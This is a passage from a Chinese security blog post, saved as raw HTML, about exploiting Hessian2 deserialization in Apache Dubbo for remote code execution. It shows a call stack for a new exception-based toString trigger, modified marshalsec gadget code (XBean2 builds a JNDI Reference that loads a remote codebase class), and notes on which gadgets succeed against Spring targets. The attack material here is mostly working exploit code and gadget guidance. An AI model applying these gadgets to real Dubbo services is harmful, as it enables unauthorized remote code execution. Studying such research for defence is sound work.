class="line">答案是可以的，去掉HotSwappableTargetSource，利用服务端找不到service时抛远程异常，导致异常输出时，执行了gadget的toString方法，从而触发，触发栈：</span><br></pre></td></tr></table></figure></p>
<p>getObject:204, ContextUtil$ReadOnlyBinding (org.apache.xbean.naming.context)<br>toString:192, Binding (javax.naming)<br>valueOf:2994, String (java.lang)<br>append:131, StringBuilder (java.lang)<br>toString:557, AbstractMap (java.util)<br>valueOf:2994, String (java.lang)<br>toString:4571, Arrays (java.util)<br>toString:209, RpcInvocation (com.alibaba.dubbo.rpc)<br>valueOf:2994, String (java.lang)<br>append:131, StringBuilder (java.lang)<br>getInvoker:213, DubboProtocol (com.alibaba.dubbo.rpc.protocol.dubbo)<br>reply:79, DubboProtocol$1 (com.alibaba.dubbo.rpc.protocol.dubbo)<br>received:114, DubboProtocol$1 (com.alibaba.dubbo.rpc.protocol.dubbo)<br>received:175, HeaderExchangeHandler (com.alibaba.dubbo.remoting.exchange.support.header)<br>received:51, DecodeHandler (com.alibaba.dubbo.remoting.transport)<br>run:57, ChannelEventRunnable (com.alibaba.dubbo.remoting.transport.dispatcher)<br>runWorker:1142, ThreadPoolExecutor (java.util.concurrent)<br>run:617, ThreadPoolExecutor$Worker (java.util.concurrent)<br>run:745, Thread (java.lang)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这是一个新的触发点，大家挖gadget可以往这个方向去看！</span><br><span class="line"></span><br><span class="line">修改后的XBean2：</span><br></pre></td></tr></table></figure>
<p>public interface XBean2 extends Gadget {</p>
<pre><code>@Args ( minArgs = 2, args = {
    &quot;codebase&quot;, &quot;classname&quot;
}, defaultArgs = {
    MarshallerBase.defaultCodebase, MarshallerBase.defaultCodebaseClass
} )
default Object makeXBean(UtilFactory uf, String[] args) throws Exception {
    Context ctx = Reflections.createWithoutConstructor(WritableContext.class);
    Reference ref = new Reference(&quot;foo&quot;, args[ 1 ], args[ 0 ]);
    ReadOnlyBinding binding = new ReadOnlyBinding(&quot;foo&quot;, ref, ctx);
    return uf.makeToStringTriggerStable(binding); // $NON-NLS-1$
}
</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">接着修改HessianBase2的实现类为XBean2：</span><br></pre></td></tr></table></figure></p>
<p>public abstract class HessianBase2 extends MarshallerBase&lt;byte[]&gt;<br>        implements XBean2 {<br>            //…<br>}<br><code>`</code></p>
<h4 id="4-attack结果"><a href="#4-attack结果" class="headerlink" title="4. attack结果"></a>4. attack结果</h4><p>如图所示：<br><img src="https://threedr3am.oss-cn-hangzhou.aliyuncs.com/%E5%85%88%E7%9F%A5/WechatIMG2.png" alt="image"></p>
<p>经过测试发现：</p>
<ol>
<li>暂时测试Spring、Spring-boot环境可打的有 Rome, Resin</li>
<li>能打Spring环境的有SpringAbstractBeanFactoryPointcutAdvisor, Rome, XBean2, Resin</li>
</ol>
<hr>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>dubbo源码浅析-默认反序列化利用之hessian2：<a href="https://www.anquanke.com/post/id/197658" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197658</a></p>
<hr>
<h3 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h3><p>Spring环境，应该有版本限制，但是版本符合范围内，用SpringAbstractBeanFactoryPointcutAdvisor这个gadget打非常好用，最好利用的一个gadget。</p>
<p>最近发现一种dubbo的新打法，不过有点条件限制，但是一点都不鸡肋。文章应该会写，但是短时间内不会发出去了，用来CTF出题岂不更妙哉？</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/dubbo/" rel="tag"># dubbo</a>
          
            <a href="/tags/Java反序列化/" rel="tag"># Java反序列化</a>
          
            <a href="/tags/RCE/" rel="tag"># RCE</a>
          
            <a href="/tags/hessian/" rel="tag"># hessian</a>
          
            <a href="/tags/marshalsec/" rel="tag"># marshalsec</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/02/21/Apache Shiro源码浅析之从远古洞到最新PaddingOracle CBC/" rel="next" title="Apache Shiro源码浅析之从远古洞到最新PaddingOracle CBC">
                <i class="fa fa-chevron-left"></i> Apache Shiro源码浅析之从远古洞到最新PaddingOracle CBC
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/02/26/dubbo反序列化问题-Hessian2安全加固和修复/" rel="prev" title="dubbo反序列化问题-Hessian2安全加固和修复">
                dubbo反序列化问题-Hessian2安全加固和修复 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/avator/duolaAmeng.jpg" alt="threedr3am">
            
              <p class="site-author-name" itemprop="name">threedr3am</p>
              <p class="site-description motion-element" itemprop="description">菜到如此</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">21</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">26</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/threedr3am" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.j10.monster/" title="Just1earnm0re" target="_blank">Just1earnm0re</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://rui0.cn/" title="ruilin" target="_blank">ruilin</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.leadroyal.cn/" title="leadroyal(卓卓师傅)" target="_blank">leadroyal(卓卓师傅)</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.kingkk.com/" title="kingkk" target="_blank">kingkk</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://driverxdw.github.io/" title="in0va'S(dw大鸽)" target="_blank">in0va'S(dw大鸽)</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://gengzongyuan.github.io/" title="大树先生(测试大牛)" target="_blank">大树先生(测试大牛)</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://chensem.github.io/" title="chensem(逆向龙哥)" target="_blank">chensem(逆向龙哥)</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://meizjm3i.github.io/" title="梅子酒" target="_blank">梅子酒</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://blog.orange.tw/" title="orange" target="_blank">orange</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-描述"><span class="nav-number">1.1.</span> <span class="nav-text">1. 描述</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-使用方法"><span class="nav-number">1.2.</span> <span class="nav-text">2. 使用方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-attack结果"><span class="nav-number">1.3.</span> <span class="nav-text">4. attack结果</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考"><span class="nav-number">2.</span> <span class="nav-text">参考</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PS"><span class="nav-number">3.</span> <span class="nav-text">PS</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">threedr3am</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
